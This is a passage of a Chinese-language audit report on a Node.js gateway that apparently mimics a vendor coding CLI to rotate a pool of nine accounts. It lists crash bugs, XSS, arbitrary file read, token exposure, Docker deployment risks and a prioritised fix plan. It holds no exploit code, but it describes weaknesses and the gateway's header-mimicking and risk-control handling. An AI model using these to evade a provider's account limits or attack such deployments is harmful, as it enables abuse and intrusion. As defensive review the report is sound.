**修复**：把 `applySystemPromptPolicy` / `ensureLeadingSystemMessage` 提到循环**之前**执行一次。

### 5.2 [静态] 双适配器代码重复

`executeRequestChain` 在 `openai.mjs`(172-411) 与 `anthropic.mjs`(215-430) 各写一份，实测仅 34 / 16 行非空行不同，重复约 11.4 KB。所有错误码分派、账号轮换、模型降级逻辑都是双份。任何调度策略调整必须同步改两处——`anthropic.mjs` 已出现"少的 16 行"就包含了 `11158` 分支缺失（`openai.mjs:287-302` 有，`anthropic.mjs` 没有）。

### 5.3 [实证] `inFlight` 泄漏点未被 try 覆盖

`openai.mjs` 中 `inFlight` 递增在 246 行，递减在 270(非2xx)、396(catch)、521(流式 finally)、611/674(非流式)。但流式路径的 `getReader()`(434) 与 `readUpstreamStream` 的调用在 `try(452)` **之外**——§S0 的实证已展示这条路径同时造成"进程崩溃 + inFlight 永久泄漏"。

### 5.4 [静态] 协议精确对齐的若干缺口

| 缺口 | 位置 | CLI 实际 |
|---|---|---|
| 未实现分档重试 | `openai.mjs` | 连接级 `Q9=3`、请求级 `mC=8`、401 级 `resolveModel401MaxRetries` 默认 `0`、AutoMode `min(8,1)=1` |
| 未实现空流重试 | 全项目 | `isRetryableEmptyStreamError` + `AK=3e5` 窗口 |
| 空流触发门槛偏松 | `openai.mjs:497` | 仅 `finish_reason∈{error, length&!reasoning}` 才判空流 |
| `placeholder` 空流类型缺失 | `stream-guard.mjs:378` | CLI 有 `placeholder`（"只收到占位 chunk 就 close"） |
| 请求体压缩 | `payload.mjs:389` | CLI **不压缩**模型请求体（gzip 只在遥测/ACP 侧）。网关对 >2048B 包 gzip——属"网关自有策略"，需在注释标注 |

注：最后一项经抓包验证，网关的 gzip 是真实存在的（`outbound.log` 有 `"Content-Encoding":"gzip"`），与本地 2.177.1 抓包一致，但与 CLI 源码层"无压缩"不符。**这是一处需要进一步取证的分歧**，不宜直接改。

### 5.5 [实证] 调度层与存储层缺陷（来自深度审阅，共 59 项，此处列 P0/P1）

| # | 问题 | 位置 | 影响 |
|---|---|---|---|
| 1 | `realm` 为完整 URL 时区域误判 | `config.mjs:49` | `{"realm":"https://www.codebuddy.ai/..."}` → 判成 cn → 国际版账号 401 |
| 2 | `accounts.json` 非数组则模块加载期崩溃 | `config.mjs:389` | `.map is not a function`，进程无法启动 |
| 3 | `daily.failedRequests` 从不累加 | `metrics.mjs:272-292` | 用真实 `stats.json` 验证：summary 失败 16，daily 合计 0，非 all 区间成功率虚高 100% |
| 4 | DB 体积熔断只算主库不算 WAL | `database.mjs:139-146` | 实测 `logs.db` 4.18MB + `-wal` 4.06MB，真实占用被低估 49%，熔断可不触发 |
| 5 | 迁移事务无 ROLLBACK | `database.mjs:100-121` | 连接滞留未结束事务，后续 `VACUUM` 必失败 → 熔断永久失效 |
| 6 | `unauthorized` 状态无任何出口 | `scheduler.mjs:723` / `openai.mjs:346` | 401 账号永久不可用，无自动/手动恢复路径 |
| 7 | 国内版签到不检查 HTTP 状态 | `scheduler.mjs:851-888` | 403 风控不置 `restricted`，`server.mjs:206` 的启动兜底匹配不到，每小时无限重试 |
| 8 | 积分并发乱序覆盖 | `scheduler.mjs:539-542` | 6 处并发调用无版本号，旧余额覆盖新余额 → 积分回退 + 假变动流水 |
| 9 | 时区三口径 | `logger.mjs:12`(本地) / `database.mjs:278`(UTC) / `metrics`(本地) | UTC+8 下 00:00–08:00 日界错位，裁剪与统计永远对不齐 |
| 10 | 每请求同步双写 19KB JSON | `metrics.mjs:318` | `stats.json` + `.bak` 各一次同步写 = 约 39KB/请求，主吞吐瓶颈 |
| 11 | 循环内 `VACUUM` | `database.mjs:171-193` | 最坏 20 次同步全库重写，挂在写入热路径上，事件循环冻结数秒 |
| 12 | `getLogs` 的 DB→ringBuffer 回落 | `logger.mjs:50-68` | 判据是"这页有没有数据"而非"DB 是否可用" → 深翻页静默返回最新 1000 条，`total` 突变 |
| 13 | 粘性"剩余保活"恒为 300s | `scheduler.mjs:290-291` | `lastActive = now` 在计算前执行，`now - lastActive` 恒 0 |
| 14 | 调度日志解析正则嵌套括号失配 | `log-parser.mjs:29` | 备注含 `)` 时 uid 丢失并整串当名称，重建统计 key 畸形 |
| 15 | `pricing` 检索写死国内 base | `pricing.mjs:181` | 与 `scheduler` 已修的同类问题（`endpointsFor`）不对称，国际版账号必 401 |

### 5.6 [实证] 运维与部署风险

本节全部经实测，核心结论：**Docker 形态不可用于生产，且是"能启动、看似正常、实则有损"的失败模式**。

**(a) 容器内冷启动会自行生成新 API Key → 每次重启密钥漂移**

`Dockerfile` 只 COPY `package.json` / `src/` / `gateway.mjs` / 两个 `*.example.json`，**不含 `config.json`**。实测在同等目录内容下启动：

```
冷启动后目录新增: config.json(433B) / gateway.log / logs.db / logs.db-shm / logs.db-wal / backups/
stdout: 网关 API Key: sk-cb-46f6ec978b... (共 1 个配置密钥) [自动生成]
```

即 `config.mjs:529` 的 `ensureApiKey()` 在 import 期就会写盘生成随机 Key。若运维未按 compose 挂载 `config.json`（或忘记先手工创建），**每次 `docker compose up` 都是一个新的随机 Key**，所有下游客户端配置集体失效。而容器 stdout 是唯一能拿到该 Key 的地方。

**(b) 未挂载的写入目标 → 容器重建即丢数据**

compose 只挂了 `config.json` / `accounts.json` / `stats.json` / `gateway.log` 四个文件，但运行时还会写：

| 未挂载的文件 | 写入者 | 重建后后果 |
|---|---|---|
| `logs.db` + `-wal` + `-shm` | `database.mjs:30` | 全部历史日志与积分留痕丢失 |
| `backups/`（含 `*.json.bak`） | `config.mjs:249` | 三级容灾退化为一级，主文件损坏即无法恢复 |
| `product.json` | `models.mjs:34` | 每次重拉上游模型矩阵（冷启动时无离线兜底） |

实测冷启动确实创建了 `backups/` 与 `logs.db*`，确认这些路径活跃。

**(c) 基础镜像版本与代码要求冲突**

`FROM node:18-alpine`，而 `package.json` 要求 `>=22`、`database.mjs:29` 使用 `require('node:sqlite')`（Node 22+ 才稳定提供）。在 Node 18 下 `init()` 走 `catch` → `useSqlite=false`，**日志检索接口静默返回空、不报错**，`/api/logs` 只能看到内存里最近 1000 条。这是"看起来能用"的降级，最难排查。

**(d) 端口无法用环境变量注入**

全项目业务层 `process.env` 引用为 **0 处**（实测扫描 `config.mjs` / `server.mjs` / `scheduler.mjs` / `database.mjs` / `metrics.mjs`）。端口取自 `server.mjs:223` 的 `config.port || 8317`，只能改 `config.json`。因此 `docker run -e PORT=9000` 无效，compose 里改端口必须同时改挂载的 `config.json`——但 `config.json` 又可能尚未存在（见 a）。

**(e) 无 `.dockerignore`，构建上下文 335 MB**

实测：构建上下文（排除 `.git` / `node_modules`）**335.2 MB**，其中 `package/` 203.6 MB、`codebuddy-code-2.179.0.tgz` 62.7 MB。这些文件虽不被 COPY，但全部要打包送进 docker daemon。在 ARM64 机顶盒上，这一步可能比构建本身更慢。

**(f) 无 healthcheck，而失败模式是"进程活着但活干不了"**

compose 只有 `restart: unless-stopped`，靠进程退出判断存活。但本项目的典型故障是上游全挂、账号全冷却、或 SQLite 降级——**进程都在跑**。已有的 `/healthz` 返回 `{"status":"ok","activeAccounts":N}` 完全够用，只是没接进 healthcheck。

**(g) 单实例是架构硬约束，但没有任何文档写明**

实测 `cluster` / `worker_threads` / `redis` 全项目 **0 命中**。调度状态全在进程内存：

```
scheduler.mjs:43  sessionStickyMap = new Map()      // 模块级单例
scheduler.mjs:47  lastApiCallTimestamp = 0
scheduler.mjs:49  postCallRefreshTimers = new Map()
```

多实例后果：`inFlight` 上限翻倍（风控阈值失效）、粘性会话命中率减半、`stats.json` 的 `.tmp → rename` 虽保证单写者原子性但会互相覆盖、`logs.db` 无 `PRAGMA busy_timeout`（实测 0 处）→ 第二个进程 `new DatabaseSync` 直接 `SQLITE_BUSY` 并被静默降级为无数据库模式。

**这一条与 `AGENTS.md` 的部署流程直接冲突**：脚本是"解压 → 平滑重启"，新旧进程短暂并存时，新进程的 SQLite 初始化会失败。

---

### 5.7 [实证] 文档与代码不一致

| # | 文档说 | 代码实测 |
|---|---|---|
| 1 | `README.md`「首字节 30s + 静默 90s」 | `stream-guard.mjs:22,30` = 1,200,000 / 300,000 |
| 2 | `Dockerfile` `FROM node:18-alpine` | `engines: >=22`；`node:sqlite` 需 22 → 日志 DB 静默降级 |
| 3 | 三套版本号 `2.5.0` / `2.179.0-gw.32` / `2.179.0` | 无单一真相源 |
| 4 | `GOLANG_REFACTOR_PROMPT.md`「4 组同值链路 ID」 | 已被 `4a350ef` 推翻为 2+2 分组；照此实施会固化已证伪假设 |
| 5 | `AGENTS.md` 要求每次改动更新 CHANGELOG | 87 提交 / 35 条目，执行率约 40% |
| 6 | `SECURITY-AUDIT` 状态"待按需实施" | 9 项风险 0 项修复（诚实，但等于欠账单） |

另外：**内网 IP 已进入公开 Git 历史**（`AGENTS.md`、`CHANGELOG.md` 各含一处），与 `DEPLOY.md` 的隔离策略不一致；`tools/deploy_lan.py` 工作区内有明文 root 口令（已被 `.gitignore` 排除，但仍在磁盘上）。

**一处需要澄清的误报**：`stats.json` 与 `config.json` 在 PowerShell 控制台下曾显示为 mojibake（如 `榛樿涓诲瘑閽`），一度被怀疑是写入编码缺陷。实测验证：两个文件均为**严格合法 UTF-8**（`TextDecoder` fatal 模式解码通过），`apiKeys[0].note` 的码点为 `U+9ED8 U+8BA4 U+4E3B U+5BC6 U+94A5` = 「默认主密钥」，完全正确。显示错乱来自 PowerShell 5.1 控制台按 GBK 渲染 UTF-8 字节，**不是代码问题**。凡后续复核中文内容，应以 Node 读取码点而非控制台肉眼判断。


---

## 六、优点（不应被上面的清单掩盖）

1. **协议纪律可执行**：`AGENTS.md` 第 0 条"没有 CLI 依据的实现视为不合格"不是口号——`src/` 中有 9 处显式标注「网关自有策略，无 CLI 对应实现」，12 处注释带 CLI 源码偏移。这种可追溯性是同类逆向项目里罕见的。
2. **零依赖**：25 个后端文件、12,602 行，运行时依赖 0。ARM64 1.8GB 机顶盒上实测常驻 37.8MB。
3. **增量写是原子的**：`writeJsonWithBackup` 用 `.tmp → rename`，配合三级容灾（主文件 → `backups/` → legacy）+ 启动时 `inFlight` 归零自愈。
4. **选号无竞态**：`selectAccount` → `inFlight++` 在同一 tick 内同步完成，无 await 插入，不存在经典双重分配。
5. **流式根因修复彻底**：心跳从注释帧改为协议事件，`touch()` 按协议分别处理，这是经过四次补丁才触达的真根因。
6. **诚实的技术反思**：`gw.30`（用报文扰动对抗风控）被 `gw.31` 主动推翻并回归 CLI 依据——全项目唯一一次自我否定，且写进了 CHANGELOG。

---

## 七、修复优先级建议

### P0 — 立即（都是小改动、高收益）

| # | 动作 | 位置 | 工作量 |
|---|---|---|---|
| 1 | 加 `unhandledRejection` / `uncaughtException` 兜底 | `server.mjs` | 4 行 |
| 2 | `handler(...)` 改为 `Promise.resolve(...).catch(...)` | `server.mjs:82` | 1 行 |
| 3 | 5 处裸 `JSON.parse` 收敛为带 try 的 `readJson(req)` | `routes.mjs:768,791,817,992,1279` | 抽 1 个工具函数 |
| 4 | 切断"S1：API Key = 管理员"：`verifyWebAuthToken` 无 `webPassword` 时**只**比对 `config.apiKey`，启动时强制生成独立 `webPassword` | `routes.mjs:57-64` | 10 行 |
| 5 | `/api/settings` 不再回传 `webPassword` / `apiKeys[].key` / `rootDir` | `routes.mjs:184-214` | 改字段 |

### P1 — 近期

| # | 动作 | 位置 |
|---|---|---|
| 6 | 把 `applySystemPromptPolicy` 移出重试循环 | `openai.mjs:252` / `anthropic.mjs:291` |
| 7 | `inFlight` 递减纳入覆盖 `getReader()` 的 try | `openai.mjs:427-452` |
| 8 | `innerHTML` 统一走自动转义标签函数；`onclick` 改 `data-uid` + 事件委托 | `accounts.js` 22 处、`models.js` 13 处、`settings.js` 6 处、`overview.js` 4 处、`logs.js` 3 处 |
| 9 | `escapeAttr` 修正闭合引号破坏问题 | `core.js:222` |
| 10 | `promptPolicy.file` 限定在 `ROOT_DIR` 内，拒绝 `..` 与绝对外跳 | `config.mjs:793-813` |
| 11 | CORS 白名单化 + `Origin` 校验；废除 `?token=` | `server.mjs:98`、`routes.mjs:159` |
| 12 | `/api/oauth/poll` 不回传 token | `routes.mjs:925-953` |

### P2 — 结构债（Go 重构前必须处理，否则会被继承）

| # | 动作 |
|---|---|
| 13 | 把 `executeRequestChain` 抽为共享模块，消除双适配器 11.4KB 重复 |
| 14 | 修正 `mb` / `CODEBUDDY_STREAM_TIMEOUT_MS` 的注释归因（对齐 `AK` 与"空闲超时"语义） |
| 15 | `stats.json` 写入改批量/异步（当前 39KB 同步写/请求） |
| 16 | DB 体积熔断纳入 `-wal` 统计；`VACUUM` 移出写入热路径 |
| 17 | 统一时区口径（建议全用本地 `getTodayString`） |
| 18 | 为 `unauthorized` 状态补恢复出口 |
| 19 | 补最小回归测试（当前 0 测试，而 S0/S1 都是"一条 curl 就能发现"的类型） |
| 20 | 同步 README / GOLANG_REFACTOR_PROMPT 的过期内容；统一版本号 |

### P2.5 — 运维/部署（若使用 Docker 形态，这几条必须先于上线）
| # | 动作 | 依据 |
|---|---|---|
| 21 | `Dockerfile` 基础镜像改 `node:22-alpine` 或更高 | §5.6(c)，当前 Node 18 会让日志 DB 静默降级 |
| 22 | compose 补挂载 `logs.db`（含 `-wal`/`-shm`）、`backups/`、`product.json` | §5.6(b)，仓库根创建，重建即丢 |
| 23 | 增加 `.dockerignore`（至少排除 `package/`、`*.tgz`、`_dist/`、`backups/`、`logs.db*`） | §5.6(e)，当前上下文 335 MB |
| 24 | 增加 healthcheck 指向 `/healthz` | §5.6(f)，`restart` 只能发现进程退出，发现不了上游全挂 |
| 25 | 若要保持密钥稳定，必须预置 `config.json` 再启动 | §5.6(a)，否则每次启动生成新 Key |
| 26 | `database.mjs` 补 `PRAGMA busy_timeout`，或明确禁止并行启动 | §5.6(g)，部署脚本的"平滑重启"会短暂双实例 |
| 27 | 在 `AGENTS.md` / `DEPLOY.md` 中写明**单实例**是架构硬约束 | §5.6(g)，当前无任何文档提及 |

### P3 — 凭据卫生（非代码可解）

- 轮换已进入公开 Git 历史的内网 IP 相关凭据
- 处理 `tools/deploy_lan.py` 中的明文 root 口令
- `accounts.json` 中 9 个账号的 accessToken / refreshToken 均为明文（设计如此，但需明确文件权限）

### P4 — `/v3/config` 刷新机制对齐（见 §2.5）

| # | 动作 | 依据 |
|---|---|---|
| 28 | `models.mjs:261` 的 `5 * 60 * 1000` 补注释：说明是网关自有策略（CLI 为 `48e4`）及理由 | `AGENTS.md` 第 0 条要求数值可追溯 |
| 29 | 补 2 秒节流，避免多路并发同时触发懒刷新 | CLI `PROXY_SYNC_THROTTLE_MS = 2e3` |
| 30 | 补失败退避 `[1e3, 2e3, 4e3, 8e3, 16e3]`，当前失败即静默回落磁盘快照 | CLI `fetchWithRetry` |
| 31 | `errors.mjs` 增补 `11136`，命中时触发模型矩阵强制刷新 | CLI `ModelPermissionErrorInterceptor`（offset 15878514） |

---

## 附录 A：验证方法与环境

所有实证均在 **Node v26.13.1 / Windows** 上执行，探针脚本用完即删（`git status` 保持干净）。

| 验证项 | 方法 | 结果 |
|---|---|---|
| 进程崩溃路径 1 | 复刻 `routes.mjs:992` 结构，发送非法 JSON | 进程退出，`SyntaxError` |
| 进程崩溃路径 2 | 复刻 `openai.mjs:427-434` 时序 | `ERR_HTTP_HEADERS_SENT` + 进程退出 |
| 未捕获 Promise 行为 | `handler()` 不 await 直接抛错 | 进程退出（Node ≥15 默认） |
| 提示词累积 | 复刻 `applySystemPromptPolicy` append 逻辑连调 3 次 | system 消息 2→3→4 |
| 文件读取链 | 直接 `import` 真实模块调 `loadSystemPromptContent` | 成功读出 `config.json` / `accounts.json` / `src/config.mjs` |
| XSS | 复刻 `accounts.js:469` 渲染路径 | 载荷成为真实 DOM 节点 |
| CLI 常量归因 | 在 28MB 压缩产物中定位偏移并读取原文 | `mb` 与 `AK` 确为两个不同常量 |
| 请求头真实性 | 读 `.capture/hook/logs/outbound.log` 实际抓包 | 38 头确实在线，`SKIP_INTERNAL_HEADERS` 未设 |
| 运行时状态 | 附加探针到运行实例 `/healthz` | `{"status":"ok","activeAccounts":9}` |
| 容器冷启动 | 在临时目录复刻 Dockerfile 的 COPY 清单后启动 | 自动生成新 Key、创建 `backups/` 与 `logs.db*` |
| 端口注入 | 扫描业务层 `process.env` 引用 | 0 处；端口只能来自 `config.json` |
| 提示词文件缺失回落 | 调 `loadSystemPromptContent('v1.1.40_prompt.txt')` | 读到默认提示词（Dockerfile 未 COPY 但仓库有） |
| 构建上下文体积 | 递归统计排除 `.git`/`node_modules` | 335.2 MB，无 `.dockerignore` |
| 单实例约束 | grep `cluster`/`worker_threads`/`redis` | 全部 0 命中 |
| 日志解析正则 | 用真实备注「主力日常主号 (VIP)」测试 | 捕获组错位，uid 退化为整串名称 |
| 中文编码真伪 | `TextDecoder(fatal)` + 码点比对 | `stats.json`/`config.json` 均为合法 UTF-8 |

**两次自我纠错记录**：

1. 曾据 CLI 源码中的"内部头清理名单"判定网关多发了 `X-Requested-With` / `x-stainless-*`，后被抓包证据推翻（删除逻辑受 `CODEBUDDY_SKIP_INTERNAL_HEADERS` 环境变量控制，默认不删）。该结论已撤回。
2. 曾据 PowerShell 控制台输出判定 `stats.json` / `config.json` 存在中文 mojibake（写入编码缺陷）。用 Node 读取码点后推翻——文件是合法 UTF-8，错乱来自 PowerShell 5.1 按 GBK 渲染。该结论已撤回，并写入 §5.7 作为复核方法提醒。

## 附录 B：关键实证代码位置索引

| 主题 | 文件:行 |
|---|---|
| 请求总线与鉴权 | `src/server.mjs:97-165` |
| 请求体读取（50MB 上限） | `src/server.mjs:49-94` |
| 崩溃点：未 catch 的 handler 调用 | `src/server.mjs:82` |
| 控制台鉴权回落 | `src/web/routes.mjs:50-64` |
| 明文回传配置 | `src/web/routes.mjs:182-215` |
| 无 try 的裸 JSON.parse | `src/web/routes.mjs:768,791,817,992,1279` |
| 令牌存 localStorage | `src/web/public/scripts/core.js:124` |
| 未转义的 email/uid | `src/web/public/scripts/accounts.js:468-469` |
| 转义函数缺陷 | `src/web/public/scripts/core.js:213-227` |
| 任意文件读取 | `src/config.mjs:793-813` |
| 提示词策略非幂等 | `src/upstream/payload.mjs:109-124` |
| 策略调用在循环内 | `src/adapters/openai.mjs:252` |
| 流式头已发后抛错 | `src/adapters/openai.mjs:427,434,679` |
| 空流分类器 | `src/upstream/stream-guard.mjs:339-383` |
| 心跳协议事件 | `src/upstream/stream-guard.mjs:260-319` |
| 38 个请求头 | `src/upstream/headers.mjs:189-296` |
| UA 风控 | `src/upstream/headers.mjs:37-52` |
| 业务码分派 | `src/upstream/errors.mjs:2-72` |
| 选号策略 | `src/core/scheduler.mjs:215-372` |
| 积分刷新 | `src/core/scheduler.mjs:498-585` |
| 三级容灾持久化 | `src/config.mjs:300-386` |
| DB 体积熔断 | `src/core/database.mjs:154-207` |
| 每请求同步写盘 | `src/core/metrics.mjs:318` |
| 双适配器重复 | `src/adapters/openai.mjs:172-411` vs `anthropic.mjs:215-430` |
| 端口唯一来源 | `src/server.mjs:223`（`config.port \|\| 8317`） |
| 冷启动自动生成 Key | `src/config.mjs:529-552`（`ensureApiKey` + 模块级副作用） |
| SQLite 初始化静默降级 | `src/core/database.mjs:27-88` |
| 备份目录（容器内未挂载） | `src/config.mjs:246-261` |
| 单实例全局状态 | `src/core/scheduler.mjs:43,47,49` |
| 无 busy_timeout | `src/core/database.mjs:34-37`（仅设 `journal_mode` / `synchronous`） |
| 容器编排 | `Dockerfile:1-16`、`docker-compose.yml:1-12` |

---

*本报告的所有结论均基于实测。凡是未经运行时验证的推断，已明确标注为 [静态]；凡是证据不足以判定的，已标注为"证据缺口"而非缺陷。*
